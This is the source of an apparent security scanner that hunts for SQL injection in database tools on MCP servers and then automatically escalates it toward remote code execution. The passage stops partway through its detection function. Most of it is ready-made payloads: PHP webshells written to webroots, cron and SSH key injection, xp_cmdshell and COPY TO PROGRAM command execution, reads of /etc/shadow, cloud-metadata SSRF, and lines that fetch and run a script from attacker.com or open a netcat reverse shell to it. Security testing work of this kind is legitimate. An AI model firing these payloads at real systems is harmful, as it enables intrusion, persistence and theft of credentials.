"""
SQL Injection to RCE Scanner for MCP Servers

This scanner identifies SQL injection vulnerabilities in MCP database tools
and attempts to escalate them to Remote Code Execution.

Supports: SQLite, PostgreSQL, MySQL/MariaDB, MSSQL, Oracle
"""

import asyncio
import re
import time
from dataclasses import dataclass
from typing import Optional
from mcpsec.scanners.base import BaseScanner
from mcpsec.client.mcp_client import MCPSecClient
from mcpsec.models import Finding, Severity, ServerProfile, ToolInfo


@dataclass
class SQLiResult:
    """Result of a SQL injection test"""
    vulnerable: bool
    technique: str  # error, boolean, time, union, stacked
    payload: str
    response: str
    delay: float = 0.0
    db_type: Optional[str] = None
    evidence: str = ""


class SQLInjectionRCEScanner(BaseScanner):
    name = "sql-rce"
    description = "SQL Injection to RCE scanner for database MCP tools"

    # ===========================
    # PHASE 1: TOOL DISCOVERY
    # ===========================
    
    # Tool name patterns indicating database interaction
    DB_TOOL_PATTERNS = [
        r"sql", r"query", r"database", r"db", r"sqlite", r"mysql", 
        r"postgres", r"mssql", r"oracle", r"execute", r"run_query",
        r"raw_query", r"exec_sql", r"select", r"insert", r"update",
        r"delete", r"create", r"drop", r"alter", r"table", r"schema",
        r"read_query", r"write_query", r"list_tables", r"describe",
        r"fetch", r"cursor", r"connection", r"pool", r"transaction",
        r"commit", r"rollback", r"prepared", r"statement", r"catalog",
        r"metadata", r"information_schema", r"sys\.", r"dba_",
    ]
    
    # Parameter names that likely contain SQL
    SQL_PARAM_PATTERNS = [
        r"query", r"sql", r"statement", r"command", r"expression",
        r"filter", r"where", r"condition", r"predicate", r"clause",
        r"order_by", r"group_by", r"having", r"limit", r"offset",
        r"table", r"column", r"field", r"schema", r"database",
        r"input", r"search", r"term", r"pattern", r"criteria",
    ]
    
    # Description keywords
    DB_DESCRIPTION_PATTERNS = [
        r"sql", r"query", r"database", r"table", r"select", r"insert",
        r"execute.*statement", r"run.*query", r"fetch.*data",
        r"sqlite", r"postgresql", r"mysql", r"mariadb", r"mssql",
        r"oracle", r"dynamodb", r"mongodb", r"cassandra", r"redis",
    ]

    # ===========================
    # PHASE 2: SQLi DETECTION
    # ===========================
    
    # Error-based detection payloads (database-agnostic)
    ERROR_BASED_PAYLOADS = [
        # Basic syntax breakers
        ("single_quote", "'", "Basic single quote"),
        ("double_quote", '"', "Basic double quote"),
        ("backtick", "`", "Backtick (MySQL)"),
        ("backslash", "\\", "Backslash escape"),
        ("semicolon", ";", "Statement terminator"),
        ("double_dash", "--", "SQL comment"),
        ("hash_comment", "#", "MySQL comment"),
        ("block_comment", "/**/", "Block comment"),
        
        # Parenthesis imbalance
        ("open_paren", "(", "Unbalanced open paren"),
        ("close_paren", ")", "Unbalanced close paren"),
        ("multi_paren", "((((", "Multiple unbalanced parens"),
        
        # Quote variations
        ("unicode_quote", "\u0027", "Unicode single quote"),
        ("fullwidth_quote", "\uff07", "Fullwidth apostrophe"),
        ("modifier_quote", "\u02bc", "Modifier letter apostrophe"),
        
        # Function syntax errors
        ("broken_func", "CONCAT(", "Incomplete function"),
        ("invalid_func", "NOTAFUNCTION()", "Invalid function name"),
    ]
    
    # Boolean-based blind detection
    BOOLEAN_BASED_PAYLOADS = [
        # AND-based
        ("and_true", "' AND '1'='1", "AND true condition"),
        ("and_false", "' AND '1'='2", "AND false condition"),
        ("and_true_num", "' AND 1=1--", "AND numeric true"),
        ("and_false_num", "' AND 1=2--", "AND numeric false"),
        
        # OR-based
        ("or_true", "' OR '1'='1", "OR true condition"),
        ("or_false", "' OR '1'='2", "OR false condition"),
        ("or_bypass", "' OR 1=1--", "Classic OR bypass"),
        ("or_bypass_hash", "' OR 1=1#", "OR bypass MySQL"),
        
        # Double encoding
        ("double_url_and", "%27%20AND%20%271%27%3D%271", "URL encoded AND"),
        ("double_url_or", "%27%20OR%20%271%27%3D%271", "URL encoded OR"),
        
        # Case variations
        ("mixed_case_and", "' AnD '1'='1", "Mixed case AND"),
        ("mixed_case_or", "' oR '1'='1", "Mixed case OR"),
        
        # Whitespace alternatives
        ("tab_and", "'\tAND\t'1'='1", "Tab separated AND"),
        ("newline_and", "'\nAND\n'1'='1", "Newline separated AND"),
        ("comment_space", "'/**/AND/**/'1'='1", "Comment as space"),
        
        # Math-based
        ("math_true", "' AND 2*3=6--", "Math true"),
        ("math_false", "' AND 2*3=7--", "Math false"),
        
        # String comparison
        ("string_true", "' AND 'a'='a'--", "String true"),
        ("string_false", "' AND 'a'='b'--", "String false"),
        ("like_true", "' AND 'abc' LIKE 'a%'--", "LIKE true"),
        ("like_false", "' AND 'abc' LIKE 'x%'--", "LIKE false"),
    ]
    
    # Time-based blind detection (per database)
    TIME_BASED_PAYLOADS = {
        "generic": [
            ("sleep_5", "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", 5),
        ],
        "mysql": [
            ("mysql_sleep_3", "' OR SLEEP(3)--", 3),
            ("mysql_sleep_5", "'; SELECT SLEEP(5);--", 5),
            ("mysql_benchmark", "' OR BENCHMARK(10000000,SHA1('test'))--", 3),
            ("mysql_if_sleep", "' OR IF(1=1,SLEEP(3),0)--", 3),
            ("mysql_case_sleep", "' OR CASE WHEN 1=1 THEN SLEEP(3) ELSE 0 END--", 3),
        ],
        "postgres": [
            ("pg_sleep_3", "'; SELECT pg_sleep(3);--", 3),
            ("pg_sleep_5", "' OR pg_sleep(5)--", 5),
            ("pg_sleep_conditional", "'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) END;--", 3),
            ("pg_generate_series", "'; SELECT generate_series(1,10000000);--", 3),
        ],
        "mssql": [
            ("mssql_waitfor_3", "'; WAITFOR DELAY '0:0:3';--", 3),
            ("mssql_waitfor_5", "'; WAITFOR DELAY '0:0:5';--", 5),
            ("mssql_stacked_wait", "'; IF 1=1 WAITFOR DELAY '0:0:3';--", 3),
        ],
        "sqlite": [
            # SQLite doesn't have sleep, use heavy computation
            ("sqlite_heavy_1", "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(50000000))))--", 2),
            ("sqlite_heavy_2", "' OR 1=1 AND 1=LIKE('A',UPPER(HEX(RANDOMBLOB(100000000/2))))--", 3),
            ("sqlite_recursive", "' UNION SELECT 1 FROM (WITH RECURSIVE cnt(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM cnt LIMIT 10000000) SELECT x FROM cnt);--", 3),
        ],
        "oracle": [
            ("oracle_sleep_3", "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',3)='a'--", 3),
            ("oracle_sleep_5", "'; BEGIN DBMS_LOCK.SLEEP(5); END;--", 5),
            ("oracle_heavy", "' OR (SELECT COUNT(*) FROM ALL_OBJECTS, ALL_OBJECTS)>0--", 3),
        ],
    }
    
    # UNION-based detection
    UNION_BASED_PAYLOADS = [
        # Column count enumeration
        ("union_null_1", "' UNION SELECT NULL--", "UNION 1 column"),
        ("union_null_2", "' UNION SELECT NULL,NULL--", "UNION 2 columns"),
        ("union_null_3", "' UNION SELECT NULL,NULL,NULL--", "UNION 3 columns"),
        ("union_null_4", "' UNION SELECT NULL,NULL,NULL,NULL--", "UNION 4 columns"),
        ("union_null_5", "' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "UNION 5 columns"),
        ("union_null_10", "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--", "UNION 10 columns"),
        
        # ORDER BY enumeration
        ("order_1", "' ORDER BY 1--", "ORDER BY 1"),
        ("order_5", "' ORDER BY 5--", "ORDER BY 5"),
        ("order_10", "' ORDER BY 10--", "ORDER BY 10"),
        ("order_100", "' ORDER BY 100--", "ORDER BY 100 (should fail)"),
        
        # Type detection
        ("union_string", "' UNION SELECT 'a'--", "UNION string"),
        ("union_int", "' UNION SELECT 1--", "UNION integer"),
        ("union_version", "' UNION SELECT @@version--", "UNION version (MySQL/MSSQL)"),
        ("union_version_pg", "' UNION SELECT version()--", "UNION version (PostgreSQL)"),
    ]
    
    # Stacked query detection
    STACKED_QUERY_PAYLOADS = [
        ("stacked_select", "'; SELECT 1;--", "Stacked SELECT"),
        ("stacked_waitfor", "'; WAITFOR DELAY '0:0:1';--", "Stacked WAITFOR"),
        ("stacked_sleep", "'; SELECT SLEEP(1);--", "Stacked SLEEP"),
        ("stacked_multi", "'; SELECT 1; SELECT 2;--", "Multiple stacked"),
    ]
    
    # WAF/Filter bypass payloads
    BYPASS_PAYLOADS = [
        # Case manipulation
        ("case_select", "' uNiOn SeLeCt NULL--", "Mixed case UNION"),
        ("case_and", "' aNd '1'='1", "Mixed case AND"),
        
        # Comment injection
        ("inline_comment", "' UN/**/ION SEL/**/ECT NULL--", "Inline comments"),
        ("mysql_version_comment", "' /*!50000UNION*/ /*!50000SELECT*/ NULL--", "MySQL version comment"),
        
        # Encoding bypasses
        ("hex_select", "' UNION %53%45%4C%45%43%54 NULL--", "Hex encoded SELECT"),
        ("unicode_space", "'\u00a0UNION\u00a0SELECT\u00a0NULL--", "Unicode space"),
        ("double_encode", "%2527%2520OR%25201%253D1--", "Double URL encode"),
        
        # Alternative representations
        ("char_concat", "' UNION SELECT CHAR(65)||CHAR(66)--", "CHAR concatenation"),
        ("concat_ws", "' UNION SELECT CONCAT_WS(',',1,2,3)--", "CONCAT_WS"),
        
        # Null byte injection
        ("null_byte", "' OR 1=1%00--", "Null byte"),
        ("null_byte_mid", "'%00' OR '1'='1", "Null byte mid-string"),
        
        # HPP (HTTP Parameter Pollution) style
        ("duplicate_param", "' OR '1'='1'/*", "Comment terminator"),
        
        # Scientific notation
        ("scientific", "' OR 1e0=1e0--", "Scientific notation"),
        
        # JSON/XML escapes
        ("json_escape", "' OR '\\u0031'='\\u0031'--", "JSON unicode escape"),
    ]

    # ===========================
    # PHASE 3: DB FINGERPRINTING
    # ===========================
    
    DB_FINGERPRINT_PAYLOADS = {
        "version_queries": [
            # PostgreSQL
            ("pg_version", "' UNION SELECT version()--", r"PostgreSQL \d+"),
            ("pg_current_db", "' UNION SELECT current_database()--", r".+"),
            
            # MySQL/MariaDB
            ("mysql_version", "' UNION SELECT @@version--", r"\d+\.\d+\.\d+.*MySQL|MariaDB"),
            ("mysql_user", "' UNION SELECT user()--", r".+@.+"),
            
            # MSSQL
            ("mssql_version", "' UNION SELECT @@version--", r"Microsoft SQL Server"),
            ("mssql_servername", "' UNION SELECT @@servername--", r".+"),
            
            # SQLite
            ("sqlite_version", "' UNION SELECT sqlite_version()--", r"\d+\.\d+"),
            
            # Oracle
            ("oracle_version", "' UNION SELECT banner FROM v$version WHERE ROWNUM=1--", r"Oracle"),
            ("oracle_user", "' UNION SELECT user FROM dual--", r".+"),
        ],
        
        "error_fingerprints": {
            "sqlite": [
                r"sqlite3\.OperationalError",
                r"SQLITE_ERROR",
                r"unrecognized token",
                r"no such table",
                r"no such column",
                r"near \".*\": syntax error",
            ],
            "mysql": [
                r"You have an error in your SQL syntax",
                r"mysql_fetch",
                r"MySQL server version",
                r"mysqli?_",
                r"MariaDB server",
                r"SQL syntax.*MySQL",
            ],
            "postgres": [
                r"pg_query",
                r"pg_exec",
                r"psycopg2",
                r"PostgreSQL.*ERROR",
                r"syntax error at or near",
                r"invalid input syntax",
                r"unterminated quoted string",
            ],
            "mssql": [
                r"Microsoft.*ODBC",
                r"Microsoft.*SQL.*Server",
                r"Unclosed quotation mark",
                r"mssql_query",
                r"\[SQL Server\]",
                r"SQLServer JDBC",
            ],
            "oracle": [
                r"ORA-\d{5}",
                r"Oracle.*Driver",
                r"oracle\.jdbc",
                r"quoted string not properly terminated",
            ],
        }
    }

    # ===========================
    # PHASE 4: RCE ESCALATION
    # ===========================
    
    # SQLite RCE vectors
    SQLITE_RCE_PAYLOADS = [
        # ATTACH DATABASE for file write
        ("attach_tmp", "'; ATTACH DATABASE '/tmp/mcpsec_sqli_test.db' AS pwned;--", 
         "ATTACH to /tmp", "file_write"),
        ("attach_tmp_win", "'; ATTACH DATABASE 'C:\\Windows\\Temp\\mcpsec_test.db' AS pwned;--", 
         "ATTACH to Windows temp", "file_write"),
        ("attach_var_tmp", "'; ATTACH DATABASE '/var/tmp/mcpsec_test.db' AS pwned;--", 
         "ATTACH to /var/tmp", "file_write"),
        
        # Web shell attempts
        ("attach_webroot_linux", "'; ATTACH DATABASE '/var/www/html/mcpsec.php' AS pwned; CREATE TABLE pwned.x(y TEXT); INSERT INTO pwned.x VALUES('<?php system($_GET[\"c\"]);?>');--", 
         "PHP shell to webroot", "webshell"),
        ("attach_webroot_nginx", "'; ATTACH DATABASE '/usr/share/nginx/html/mcpsec.php' AS pwned;--", 
         "ATTACH to nginx webroot", "webshell"),
        
        # Cron job injection
        ("attach_cron", "'; ATTACH DATABASE '/etc/cron.d/mcpsec_test' AS pwned; CREATE TABLE pwned.x(y TEXT); INSERT INTO pwned.x VALUES('* * * * * root id > /tmp/pwned');--", 
         "Cron job injection", "rce"),
        ("attach_cron_user", "'; ATTACH DATABASE '/var/spool/cron/crontabs/root' AS pwned;--", 
         "User crontab injection", "rce"),
        
        # SSH key injection
        ("attach_ssh", "'; ATTACH DATABASE '/root/.ssh/authorized_keys' AS pwned;--", 
         "SSH key injection", "rce"),
        ("attach_ssh_user", "'; ATTACH DATABASE '~/.ssh/authorized_keys' AS pwned;--", 
         "User SSH key injection", "rce"),
        
        # Load extension (if enabled)
        ("load_ext_so", "'; SELECT load_extension('/tmp/evil.so');--", 
         "Load .so extension", "rce"),
        ("load_ext_dll", "'; SELECT load_extension('C:\\evil.dll');--", 
         "Load .dll extension", "rce"),
        ("load_ext_path_traversal", "'; SELECT load_extension('../../../tmp/evil');--", 
         "Path traversal extension load", "rce"),
        
        # Writeable functions via ATTACH
        ("attach_init", "'; ATTACH DATABASE ':memory:' AS mem; CREATE TABLE mem.init(x); INSERT INTO mem.init VALUES('malicious');--",
         "Memory database test", "probe"),
    ]
    
    # PostgreSQL RCE vectors
    POSTGRES_RCE_PAYLOADS = [
        # COPY TO PROGRAM - direct RCE (PostgreSQL 9.3+)
        ("copy_program_id", "'; COPY (SELECT '') TO PROGRAM 'id > /tmp/mcpsec_pg_pwned';--", 
         "COPY TO PROGRAM id", "rce"),
        ("copy_program_whoami", "'; COPY (SELECT '') TO PROGRAM 'whoami > /tmp/mcpsec_pg_whoami';--", 
         "COPY TO PROGRAM whoami", "rce"),
        ("copy_program_curl", "'; COPY (SELECT '') TO PROGRAM 'curl http://169.254.169.254/latest/meta-data/ -o /tmp/mcpsec_meta';--", 
         "COPY TO PROGRAM SSRF", "rce"),
        ("copy_program_wget", "'; COPY (SELECT '') TO PROGRAM 'wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh';--", 
         "COPY TO PROGRAM reverse shell", "rce"),
        ("copy_program_bash", "'; COPY (SELECT '') TO PROGRAM 'bash -c \"id\"';--", 
         "COPY TO PROGRAM bash", "rce"),
        ("copy_program_nc", "'; COPY (SELECT '') TO PROGRAM 'nc -e /bin/sh attacker.com 4444';--", 
         "COPY TO PROGRAM netcat", "rce"),
        
        # COPY FROM/TO file operations
        ("copy_passwd", "'; CREATE TABLE mcpsec_test(t TEXT); COPY mcpsec_test FROM '/etc/passwd';--", 
         "COPY FROM /etc/passwd", "file_read"),
        ("copy_shadow", "'; COPY mcpsec_test FROM '/etc/shadow';--", 
         "COPY FROM /etc/shadow", "file_read"),
        ("copy_to_tmp", "'; COPY (SELECT 'test') TO '/tmp/mcpsec_pg_test';--", 
         "COPY TO file", "file_write"),
        
        # Large object operations
        ("lo_import", "'; SELECT lo_import('/etc/passwd');--", 
         "Large object import", "file_read"),
        ("lo_export", "'; SELECT lo_export(12345, '/tmp/mcpsec_lo_test');--", 
         "Large object export", "file_write"),
        
        # Extension-based RCE
        ("create_ext_plpython", "'; CREATE EXTENSION plpythonu; CREATE FUNCTION mcpsec_rce() RETURNS text AS $$ import os; return os.popen('id').read() $$ LANGUAGE plpythonu;--", 
         "PL/Python RCE", "rce"),
        ("create_ext_plperl", "'; CREATE EXTENSION plperlu; CREATE FUNCTION mcpsec_rce() RETURNS text AS $$ return `id` $$ LANGUAGE plperlu;--", 
         "PL/Perl RCE", "rce"),
        ("create_ext_pltcl", "'; CREATE EXTENSION pltclu; CREATE FUNCTION mcpsec_rce() RETURNS text AS $$ exec id $$ LANGUAGE pltclu;--", 
         "PL/Tcl RCE", "rce"),
        
        # PostgreSQL file functions
        ("pg_read_file", "'; SELECT pg_read_file('/etc/passwd');--", 
         "pg_read_file", "file_read"),
        ("pg_read_binary", "'; SELECT pg_read_binary_file('/etc/passwd');--", 
         "pg_read_binary_file", "file_read"),
        ("pg_ls_dir", "'; SELECT pg_ls_dir('/etc');--", 
         "pg_ls_dir", "file_read"),
        
        # dblink for SSRF
        ("dblink_ssrf", "'; SELECT * FROM dblink('host=169.254.169.254 dbname=metadata', 'SELECT 1') AS t(id int);--", 
         "dblink SSRF", "ssrf"),
    ]
    
    # MySQL RCE vectors
    MYSQL_RCE_PAYLOADS = [
        # INTO OUTFILE - file write
        ("outfile_tmp", "' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/tmp/mcpsec_shell.php'--", 
         "INTO OUTFILE /tmp", "file_write"),
        ("outfile_webroot", "' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/mcpsec.php'--", 
         "INTO OUTFILE webroot", "webshell"),
        ("outfile_win_temp", "' UNION SELECT 'test' INTO OUTFILE 'C:\\Windows\\Temp\\mcpsec.txt'--", 
         "INTO OUTFILE Windows", "file_write"),
        
        # INTO DUMPFILE - binary write
        ("dumpfile_tmp", "' UNION SELECT 0x3C3F7068702073797374656D28245F4745545B2263225D293B3F3E INTO DUMPFILE '/tmp/mcpsec.php'--", 
         "INTO DUMPFILE PHP", "webshell"),
        ("dumpfile_udf", "' UNION SELECT [UDF_BINARY] INTO DUMPFILE '/usr/lib/mysql/plugin/mcpsec.so'--", 
         "INTO DUMPFILE UDF", "rce"),
        
        # LOAD_FILE - file read
        ("loadfile_passwd", "' UNION SELECT LOAD_FILE('/etc/passwd')--", 
         "LOAD_FILE /etc/passwd", "file_read"),
        ("loadfile_shadow", "' UNION SELECT LOAD_FILE('/etc/shadow')--", 
         "LOAD_FILE /etc/shadow", "file_read"),
        ("loadfile_mysql_conf", "' UNION SELECT LOAD_FILE('/etc/mysql/my.cnf')--", 
         "LOAD_FILE my.cnf", "file_read"),
        ("loadfile_win", "' UNION SELECT LOAD_FILE('C:\\Windows\\system.ini')--", 
         "LOAD_FILE Windows", "file_read"),
        
        # UDF (User Defined Function)
        ("udf_check_plugin_dir", "' UNION SELECT @@plugin_dir--", 
         "Check plugin dir", "probe"),
        ("udf_check_secure_file", "' UNION SELECT @@secure_file_priv--", 
         "Check secure_file_priv", "probe"),
        ("udf_check_version", "' UNION SELECT @@version--", 
         "Check version", "probe"),
        
        # sys_exec UDF (if installed)
        ("udf_sys_exec", "'; SELECT sys_exec('id > /tmp/mcpsec_udf');--", 
         "sys_exec UDF", "rce"),
        ("udf_sys_eval", "'; SELECT sys_eval('id');--", 
         "sys_eval UDF", "rce"),
        
        # General Log for file write
        ("general_log_on", "'; SET global general_log = 'ON';--", 
         "Enable general log", "probe"),
        ("general_log_file", "'; SET global general_log_file = '/tmp/mcpsec.php';--", 
         "Set log file", "file_write"),
        ("general_log_payload", "'; SELECT '<?php system($_GET[c]);?>';--", 
         "Log PHP payload", "webshell"),
        
        # Slow query log
        ("slow_log_on", "'; SET global slow_query_log = 'ON';--", 
         "Enable slow log", "probe"),
        ("slow_log_file", "'; SET global slow_query_log_file = '/tmp/mcpsec_slow.php';--", 
         "Set slow log file", "file_write"),
    ]
    
    # MSSQL RCE vectors
    MSSQL_RCE_PAYLOADS = [
        # xp_cmdshell - direct RCE
        ("xp_cmdshell_enable", "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--", 
         "Enable advanced options", "probe"),
        ("xp_cmdshell_enable_2", "'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--", 
         "Enable xp_cmdshell", "probe"),
        ("xp_cmdshell_whoami", "'; EXEC xp_cmdshell 'whoami';--", 
         "xp_cmdshell whoami", "rce"),
        ("xp_cmdshell_id", "'; EXEC xp_cmdshell 'id';--", 
         "xp_cmdshell id", "rce"),
        ("xp_cmdshell_dir", "'; EXEC xp_cmdshell 'dir C:\\';--", 
         "xp_cmdshell dir", "rce"),
        ("xp_cmdshell_net", "'; EXEC xp_cmdshell 'net user';--", 
         "xp_cmdshell net user", "rce"),
        ("xp_cmdshell_powershell", "'; EXEC xp_cmdshell 'powershell -c \"whoami\"';--", 
         "xp_cmdshell PowerShell", "rce"),
        
        # sp_OACreate - COM object RCE
        ("sp_oa_enable", "'; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;--", 
         "Enable OLE Automation", "probe"),
        ("sp_oa_shell", "'; DECLARE @shell INT; EXEC sp_OACreate 'WScript.Shell', @shell OUT; EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd /c whoami > C:\\temp\\mcpsec.txt';--", 
         "sp_OACreate shell", "rce"),
        
        # File operations
        ("bulk_insert", "'; BULK INSERT mcpsec_test FROM 'C:\\Windows\\System32\\drivers\\etc\\hosts';--", 
         "BULK INSERT hosts", "file_read"),
        ("openrowset_read", "'; SELECT * FROM OPENROWSET(BULK 'C:\\Windows\\System32\\drivers\\etc\\hosts', SINGLE_CLOB) AS Contents;--", 
         "OPENROWSET file read", "file_read"),
        
        # xp_dirtree / xp_fileexist
        ("xp_dirtree", "'; EXEC xp_dirtree 'C:\\';--", 
         "xp_dirtree enumeration", "file_read"),
        ("xp_fileexist", "'; EXEC xp_fileexist 'C:\\Windows\\System32\\config\\SAM';--", 
         "xp_fileexist SAM", "file_read"),
        
        # Linked servers
        ("linked_servers", "'; SELECT * FROM sys.servers;--", 
         "Enumerate linked servers", "probe"),
        ("openquery", "'; SELECT * FROM OPENQUERY([linked_server], ''SELECT @@version'');--", 
         "OPENQUERY linked server", "ssrf"),
        
        # SQL Agent jobs
        ("sql_agent_job", "'; USE msdb; EXEC dbo.sp_add_job @job_name = ''mcpsec_test'';--", 
         "Create SQL Agent job", "rce"),
    ]
    
    # Oracle RCE vectors  
    ORACLE_RCE_PAYLOADS = [
        # Java stored procedures
        ("java_shell", "'; CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED \"mcpsec\" AS import java.io.*; public class mcpsec { public static String exec(String cmd) throws IOException { return new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream())).readLine(); }};--", 
         "Java stored procedure", "rce"),
        ("java_exec", "'; SELECT mcpsec.exec('id') FROM dual;--", 
         "Execute Java procedure", "rce"),
        
        # DBMS_SCHEDULER
        ("scheduler_job", "'; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>''mcpsec'',job_type=>''EXECUTABLE'',job_action=>''/bin/bash'',number_of_arguments=>2,enabled=>FALSE); END;--", 
         "DBMS_SCHEDULER job", "rce"),
        
        # UTL_FILE
        ("utl_file_read", "'; DECLARE f UTL_FILE.FILE_TYPE; BEGIN f := UTL_FILE.FOPEN(''/etc'', ''passwd'', ''R''); END;--", 
         "UTL_FILE read", "file_read"),
        ("utl_file_write", "'; DECLARE f UTL_FILE.FILE_TYPE; BEGIN f := UTL_FILE.FOPEN(''/tmp'', ''mcpsec.txt'', ''W''); UTL_FILE.PUT_LINE(f, ''pwned''); UTL_FILE.FCLOSE(f); END;--", 
         "UTL_FILE write", "file_write"),
        
        # UTL_HTTP SSRF
        ("utl_http_ssrf", "'; SELECT UTL_HTTP.REQUEST('http://169.254.169.254/latest/meta-data/') FROM dual;--", 
         "UTL_HTTP SSRF", "ssrf"),
        
        # DBMS_XMLQUERY
        ("xmlquery_read", "'; SELECT DBMS_XMLQUERY.GETXML('SELECT * FROM v$version') FROM dual;--", 
         "DBMS_XMLQUERY", "probe"),
    ]

    # Success/failure indicators for RCE attempts
    RCE_SUCCESS_INDICATORS = [
        # Command output patterns
        r"uid=\d+",
        r"gid=\d+",
        r"root:",
        r"www-data:",
        r"postgres:",
        r"mysql:",
        r"AUTHORITY\\",
        r"NT AUTHORITY",
        r"Administrator",
        
        # File operation success
        r"COPY \d+",
        r"successfully",
        r"created",
        r"inserted",
        
        # PostgreSQL COPY TO PROGRAM success
        r"COPY 0",
        r"COPY 1",
        
        # File content indicators
        r"/bin/bash",
        r"/bin/sh",
        r"root:x:0:0",
        r"nobody:",
        r"\[boot loader\]",  # Windows system.ini
        r"\[extensions\]",   # Windows ini
    ]
    
    RCE_PARTIAL_INDICATORS = [
        # Feature exists but blocked
        r"permission denied",
        r"could not open file",
        r"access denied",
        r"Operation not permitted",
        r"pg_execute_from_program",
        r"load_extension",
        r"extension loading",
        r"secure.file" ,
        r"--secure-file-priv",
        r"server is running with",
        r"\d+ row[s]? affected",
        r"Query OK",
    ]
    
    RCE_BLOCKED_INDICATORS = [
        # Feature explicitly disabled
        r"extension loading disabled",
        r"not allowed",
        r"not permitted",
        r"disabled",
        r"xp_cmdshell.*disabled",
        r"COPY TO PROGRAM.*disabled",
        r"secure_file_priv.*NULL",
        r"--secure-file-priv=",
        r"Only SELECT queries are allowed",
        r"Only CREATE TABLE statements are allowed",
        r"query type .* not supported",
        r"restricted for read_query",
    ]

    # ===========================
    # SCANNER IMPLEMENTATION
    # ===========================

    async def scan(self, profile: ServerProfile, client: MCPSecClient | None = None) -> list[Finding]:
        findings = []
        
        if not client:
            return findings
        
        # Phase 1: Discover database tools
        db_tools = self._discover_db_tools(profile)
        if not db_tools:
            return findings
        
        for tool in db_tools:
            tool_name = tool.name
            
            # Find injectable parameters
            params = self._get_injectable_params(tool)
            
            for param_name in params:
                # Phase 2: Detect SQLi
                sqli_result = await self._detect_sqli(client, tool_name, param_name)
                
                if sqli_result.vulnerable:
                    # Create initial SQLi finding
                    findings.append(self._create_sqli_finding(tool_name, param_name, sqli_result))
                    
                    # Phase 3: Fingerprint database
                    db_type = await self._fingerprint_db(client, tool_name, param_name, sqli_result)
                    
                    # Phase 4: Attempt RCE escalation
                    rce_findings = await self._test_rce(client, tool_name, param_name, db_type)
                    findings.extend(rce_findings)
        
        return findings

    def _discover_db_tools(self, profile: ServerProfile) -> list[ToolInfo]:
        """Find tools that likely interact with databases"""
        db_tools: list[ToolInfo] = []
        
        for tool in profile.tools:
            tool_name = tool.name.lower()
            tool_desc = tool.description.lower()
            
            # Check tool name
            if any(re.search(pattern, tool_name, re.I) for pattern in self.DB_TOOL_PATTERNS):
                db_tools.append(tool)
                continue
            
            # Check description
            if any(re.search(pattern, tool_desc, re.I) for pattern in self.DB_DESCRIPTION_PATTERNS):
                db_tools.append(tool)
                continue
            
            # Check parameter names
            properties = tool.parameters
            for param_name in properties.keys():
                if any(re.search(pattern, param_name, re.I) for pattern in self.SQL_PARAM_PATTERNS):
                    db_tools.append(tool)
                    break
        
        return db_tools

    def _get_injectable_params(self, tool: ToolInfo) -> list[str]:
        """Get parameter names likely to be injectable"""
        injectable = []
        properties = tool.parameters
        
        for param_name, param_schema in properties.items():
            # Check if param name matches SQL patterns
            if any(re.search(pattern, param_name, re.I) for pattern in self.SQL_PARAM_PATTERNS):
                injectable.append(param_name)
            # Check if param accepts string type
            elif isinstance(param_schema, dict) and param_schema.get("type") == "string":
                injectable.append(param_name)
            elif hasattr(param_schema, "type") and getattr(param_schema, "type") == "string":
                injectable.append(param_name)
        
        return injectable if injectable else list(properties.keys())

    async def _detect_sqli(self, client: MCPSecClient, tool_name: str, param_name: str) -> SQLiResult:
        """Attempt to detect SQL injection using multiple techniques"""
        
        # Try error-based detection first (fastest)
        for name, payload, desc in self.ERROR_BASED_PAYLOADS:
            result = await self._test_payload(client, tool_name, param_name, payload)
            if self._is_sqli_error(result):
                return SQLiResult(
                    vulnerable=True,
                    technique="error",
                    payload=payload,
                    response=result,
                    evidence=f"Error-based SQLi detected via {desc}"
                )
        
        # Try boolean-based detection
        for i, (name, payload, desc) in enumerate(self.BOOLEAN_BASED_PAYLOADS):
            if "true" in name:
                true_payload = payload
                # Find corresponding false payload
                false_payload = ""
                if i + 1 < len(self.BOOLEAN_BASED_PAYLOADS):
                    next_name, next_payload, next_desc = self.BOOLEAN_BASED_PAYLOADS[i+1]
                    if "false" in next_name:
                        false_payload = next_payload
                
                if not false_payload:
                    false_payload = payload.replace("'1'='1", "'1'='2")
                
                true_result = await self._test_payload(client, tool_name, param_name, true_payload)
                false_result = await self._test_payload(client, tool_name, param_name, false_payload)
                
                if true_result != false_result and len(true_result) > len(false_result) * 0.5:
                    return SQLiResult(
                        vulnerable=True,
                        technique="boolean",
                        payload=true_payload,
                        response=true_result,
                        evidence=f"Boolean-based SQLi: different responses for true/false conditions"
                    )
        
        # Try time-based detection (slowest, most reliable)
        for db_type, payloads in self.TIME_BASED_PAYLOADS.items():
            for name, payload, expected_delay in payloads:
                is_delayed, actual_delay = await self._test_time_based(
                    client, tool_name, param_name, payload, expected_delay
                )
                if is_delayed:
                    return SQLiResult(
                        vulnerable=True,
                        technique="time",
                        payload=payload,
                        response=f"Delayed response: {actual_delay:.2f}s",
                        delay=actual_delay,
                        db_type=db_type if db_type != "generic" else None,
                        evidence=f"Time-based SQLi: {actual_delay:.2f}s delay (expected {expected_delay}s)"
                    )
        
        # Try UNION-based detection
        for name, payload, desc in self.UNION_BASED_PAYLOADS:
            result = await self._test_payload(client, tool_name, param_name, payload)
            if self._is_union_success(result):
                return SQLiResult(
                    vulnerable=True,
                    technique="union",
                    payload=payload,
                    response=result,
                    evidence=f"UNION-based SQLi detected"
                )
        
        # Try stacked queries
        for name, payload, desc in self.STACKED_QUERY_PAYLOADS:
            result = await self._test_payload(client, tool_name, param_name, payload)
